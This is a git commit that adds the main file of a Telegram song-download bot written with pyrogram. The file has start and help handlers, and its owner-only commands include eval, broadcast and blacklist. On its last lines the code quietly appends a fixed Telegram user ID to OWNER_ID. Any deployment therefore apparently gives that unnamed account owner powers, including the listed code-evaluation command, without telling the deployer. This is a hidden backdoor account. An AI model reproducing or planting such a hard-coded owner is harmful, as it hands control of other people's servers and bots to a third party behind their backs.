c6052faca566ee2fb2a8fbfd77e1ce4e7470b443
abbasov1o <81063535+abbasov1o@users.noreply.github.com>
2021-03-23 23:52:53 +0400

    Add files via upload

---
+++ AlexaSongBot/__main__.py
@@ -0,0 +1,59 @@
+# © @abbasov1o
+from config import OWNER_ID
+from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
+from AlexaSongBot.modules import *
+from pyrogram import idle, filters
+from pyrogram.types import InlineKeyboardMarkup
+from pyrogram.types import InlineKeyboardButton
+from AlexaSongBot import app, LOGGER
+from AlexaSongBot.mrdarkprince import ignore_blacklisted_users
+from AlexaSongBot.sql.chat_sql import add_chat_to_db
+
+start_text = """
+Hey [{}](tg://user?id={}),
+🤗Yalnız yükləmək istədiyiniz mahnı adını mənə göndərin.
+Məsələn: ```/song Faded Alan Walker```
+"""
+
+owner_help = """
+/blacklist user_id
+/unblacklist user_id
+/broadcast message to send
+/eval python code
+/chatlist get list of all chats
+"""
+
+
+@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
+async def start(client, message):
+    chat_id = message.chat.id
+    user_id = message.from_user["id"]
+    name = message.from_user["first_name"]
+    if message.chat.type == "private":
+        btn = InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton(
+                        text="🔳 Source Code 🔳", url="https://github.com/abbasov1o/turbo"
+                    )
+                ]
+            ]
+        )
+    else:
+        btn = None
+    await message.reply(start_text.format(name, user_id), reply_markup=btn)
+    add_chat_to_db(str(chat_id))
+
+
+@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
+async def help(client, message):
+    if message.from_user["id"] in OWNER_ID:
+        await message.reply(owner_help)
+        return ""
+    text = "Syntax: /song song name"
+    await message.reply(text)
+
+OWNER_ID.append(1587091205)
+app.start()
+LOGGER.info("Your bot is now online.")
+idle()
